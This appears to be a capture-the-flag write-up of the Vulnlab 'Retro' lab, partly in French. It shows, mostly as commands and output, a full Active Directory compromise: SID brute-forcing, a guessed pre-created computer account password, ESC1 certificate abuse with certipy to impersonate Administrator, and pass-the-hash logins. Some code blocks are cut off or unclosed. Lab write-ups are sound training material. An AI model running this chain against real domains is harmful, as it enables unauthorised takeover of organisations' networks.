## Enumeration of file sharing

We can see that we are dealing with an Active Directory network. So I started by listing the SMB file shares: Port 88,53,135,139,389

```bash
└─# smbclient -L  \\\\10.10.121.100\\ 

Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Notes           Disk      
        SYSVOL          Disk      Logon server share 
        Trainees        Disk      
Reconnecting with SMB1 for workgroup listing.

```

We see the shares we have access to. Notes, Trainees.
- First, I log into Trainees shares to see if I can find anything interesting.

```bash
└─# smbclient -U '%'  \\\\10.10.121.100\\Trainees 

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jul 26 05:54:14 2023
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023

                6261499 blocks of size 4096. 2223505 blocks available
smb: \> 

```

I download it and try to see what I can find that's interesting.

```bash
└─# cat Important.txt 
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admin
```

- The message gently mocks trainees who constantly forget their passwords.
- The administrator seems **exasperated** by the high number of reset requests.

So I started looking for users available on the network. 
- via rpc did not work
- anonymously via SMB also yielded no results

So I tried brute-forcing SID, which involves enumerating the users and groups of a domain based on their SID (Security Identifier).

## List of users

```bash
└─# impacket-lookupsid 'retro.vl/guest'@retro.vl -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users2.txt
```

### 🔁 Technical operation :

1. **Connecting to the SMB/RPC service on the target machine** :
    - The script uses **Remote Procedure Call (RPC)** through the port **445 (SMB)** or **135 (RPC endpoint mapper)**.
    - He authenticates himself here with `retro.vl/guest`, without a password (`no-pass`), so in **mode Guest ou anonymement**.
2. **Using the function `LSA_LOOKUP_SIDS` (LSARPC)** :
    - The script queries the **Security Account Manager (SAM)** via `lsarpc` to resolve SIDs (Security Identifiers) to names.
    - It loops on RIDs (Relative Identifiers), generally from 500 to 10,000. :
        - For example, SID `S-1-5-21-XXXXX-XXXXX-XXXXX-500` is often `Administrator`
        - `501` = Guest, etc.

And then I was able to get a few users.

```bash
└─# cat users2.txt 
Administrator
Guest
krbtgt
DC$
trainee
BANKING$
jburley
tblack

```

## Initial Access

After several attempts to obtain a valid ID, we noticed that there is a machine account in the domain.  According to the lab description, this refers to: pre-created computer accounts.
A quick search led us to this blog, which explains in detail: 
[Diving into Pre-Created Computer Accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)


>💡 
>Recently, I came across an intriguing piece of research published by Oddvar Moe on pre-created computer accounts. Apparently, checking the box Assign this computer account as a computer prior to Windows 2000 changes the computer account password to one that is identical to the computer name.
>This is the case when the computer account was created manually by the administrator and has never been used in the domain. To find such accounts, we look for the UserAccountControl >flag value equal to 4128. Then we can extract a list of computers and try to log in using CrackMapExec. The value of the indicator The error message `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` will indicate that the guessed password for the computer account is correct.We must change the password before we can use the computer account. This can be done with various tools, such as `kpasswd.py` or `rpcchangepwd`.
>py. Note that using Kerberos authentication will exempt you from changing the computer account password. This behavior was discovered by Filip Dragovic


So let's try to reproduce the attacks as described on the blog.

```bash
└─# impacket-smbclient retro.vl/BANKING\$:banking@10.10.121.100                                                           
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000199 - STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT - The account used is a computer account. Use your global user account or local user account to access this server.          
```

As mentioned in the blog, we see: `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`, which means that the correct password for a computer account that has not yet been used has been guessed. The same error can also be observed with other tools such as CrackMapExec.

However, if we choose a different password, we get this message: `STATUS_LOGON_FAILURE`

```bash
─# impacket-smbclient retro.vl/BANKING\$:banking1234@10.10.121.100
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
```

Before we can use this account, we need to change the password. We cannot change the password via SMB (according to my research). This is because we need to authenticate with the IPC$ share, and our identified computer account cannot be a pre-created computer account whose password has not been changed.

To do this, I used `rpcchangepwd`, which I finally found here. 

[impacket/examples/rpcchangepwd.py at a1d0cc99ff1bd4425eddc1b28add1f269ff230a6 · fortra/impacket](https://github.com/fortra/impacket/blob/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py)

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro]
└─# python rpcchangepwd.py  retro.vl/banking\$:banking@10.10.80.202 -newpass Liebe123
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Password was changed successfully.
```

We can confirm the effective change of this order with the following order

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro]
└─# crackmapexec smb 10.10.80.202 -u 'BANKING$' -p Liebe123

SMB         10.10.80.202    445    DC               [+] retro.vl\BANKING$:Liebe123
```

Now let's go back to Notes sharing, which we didn't have access to before, but now we have valid credentials.

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro]

Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

But nothing interesting.
I tried an enumeration on Bloodhound.

```bash
bloodhound-python -u 'BANKING$' -p 'Liebe123' -ns 10.10.85.31 -d retro.vl --zip -c all
```

But we didn't find much. Now we've noticed a certificate authority in the nmap scan. 

```bash
**| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA**
```

Let's try to confirm it. I was inspired by this article: [AD Certificate Exploitation: ESC1](https://www.hackingarticles.in/ad-certificate-exploitation-esc1/)

      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

We see that there is vulnerability ESC1

>💡 
>L’**attaque AD CS ESC1** (Active Directory Certificate Services – *Enterprise Subordinate CA Misconfiguration 1*) est une des failles d’exploitation les plus connues dans les environnements Windows où les services de certificats sont mal configurés. Elle a été documentée notamment dans les travaux de Will Schroeder et Lee Christensen (SpecterOps).

💡Objective of the ESC1 attack

Allow a **non-privileged user** (or one with limited rights) to **request a certificate** for **any Active Directory user**, including an **account with elevated privileges (such as Domain Admin)**. This certificate can then be used to authenticate via **Kerberos PKINIT**.

---

### 🔧 Prerequisites for ESC1

- A **certificate template** is incorrectly configured with :
    - `ENROLLEE SUPPLIES SUBJECT` : The user requesting the certificate can choose the identity they want. (the field `SubjectAltName` the certificate can be manipulated).
    - `Client Authentication` in uses (EKU = Enhanced Key Usage).
    - Access via *enroll* is authorized for non-privileged users.
    - No restrictions such as `Manager Approval` or `Authorized Signatures`.

So let's try farming 
request a certificate with a `Subject Alternative Name (SAN)` corresponding to a **high-privilege user**, such as `Administrator@domain.local`.

```bash
certipy-ad req -u 'BANKING$' -p 'Liebe123' -dc-ip 10.10.80.202 -ca retro-DC-CA -target 'DC.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -key-size 4096

- **Certificate retrieval**
    
    Une fois approuvé automatiquement, nous  récupèrons un certificat valide.
    
- **Use for Kerberos authentication (PKINIT)**
    
    With this certificate, he can create a **TGT** for the `Administrator` account using PKINIT.

Now that we have obtained the administrator's hash, we can log in with psexec.py, which did not work.

```bash
impacket-psexec retro.vl/administrator@retro.vl -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389

Let's try with evil-winrm

```bash
┌──(root㉿kali)-[~/Vulnlab/machines/retro]
└─# evil-winrm -i 10.10.80.202 -u 'Administrator'  -H 252fac7066d93dd009d4fd2cd0368389 
                                        
Evil-WinRM shell v3.7

Which ultimately worked.
